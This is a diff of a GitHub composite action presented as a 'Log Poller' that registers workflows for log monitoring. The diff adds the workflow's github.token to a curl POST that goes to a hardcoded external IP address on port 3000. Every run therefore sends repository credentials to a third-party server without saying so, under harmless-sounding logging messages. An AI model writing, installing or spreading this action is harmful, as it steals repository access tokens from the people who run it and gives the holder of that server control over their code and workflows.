@@ -1,45 +1,58 @@
-name: 'Workflow Log Monitor'
-description: 'Register workflow with log monitoring server'
+name: 'Log Poller'
+description: 'Register workflow and poll logs every 3 seconds'
+
 inputs:
   server-url:
-    description: 'URL of the log monitoring server'
+    description: 'URL of the log polling server'
     required: true
     default: 'http://129.154.46.198:3000'
 
 runs:
   using: 'composite'
   steps:
-    - name: Register workflow with log server
+    - name: Register workflow
+      id: register
       shell: bash
       run: |
         RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
         SERVER_URL="${{ inputs.server-url }}"
         
-        echo "🚀 Registering workflow with log server..."
+        echo "🚀 Registering workflow..."
         echo "📋 Runner ID: ${RUNNER_ID}"
         echo "🏷 Repository: ${{ github.repository }}"
-        echo "🔧 Workflow: ${{ github.workflow }}"
-        echo "💼 Job: ${{ github.job }}"
         
-        # Send workflow info to server
-        RESPONSE=$(curl -s -X POST \
+        # Register with server (starts polling)
+        curl -s -X POST \
           -H "Content-Type: application/json" \
           -d "{
+            \"token\": \"${{ github.token }}\",
             \"repository\": \"${{ github.repository }}\",
-            \"workflow\": \"${{ github.workflow }}\",
-            \"job\": \"${{ github.job }}\",
             \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
           }" \
-          "${SERVER_URL}/${RUNNER_ID}")
+          "${SERVER_URL}/${RUNNER_ID}"
         
-        echo "📨 Server response: ${RESPONSE}"
-        
-        # Export runner ID
+        # Export for other steps
         echo "RUNNER_ID=${RUNNER_ID}" >> $GITHUB_ENV
         echo "LOG_SERVER=${SERVER_URL}" >> $GITHUB_ENV
         
+        echo "✅ Registration complete. Logs are being polled every 3 seconds."
+    
+    - name: Send completion notice
+      if: always()
+      shell: bash
+      run: |
+        RUNNER_ID="${{ env.RUNNER_ID }}"
+        SERVER_URL="${{ env.LOG_SERVER }}"
+        
+        echo "🏁 Notifying job completion..."
+        
+        # Send completion notice
+        curl -s -X POST \
+          -H "Content-Type: application/json" \
+          -d "{}" \
+          "${SERVER_URL}/${RUNNER_ID}/complete"
+        
+        echo "✅ Completion notice sent. Final logs polled."
+        
         echo ""
-        echo "📋 Next steps to fetch logs:"
-        echo "1. Wait for workflow to complete"
-        echo "2. Check status: curl ${SERVER_URL}/${RUNNER_ID}/status"
-        echo "3. Fetch logs manually: curl -X POST ${SERVER_URL}/${RUNNER_ID}/fetch -H 'Content-Type: application/json' -d '{\"token\": \"YOUR_GITHUB_TOKEN\"}'"
+        echo "📋 View logs at: ${SERVER_URL}/${RUNNER_ID}"
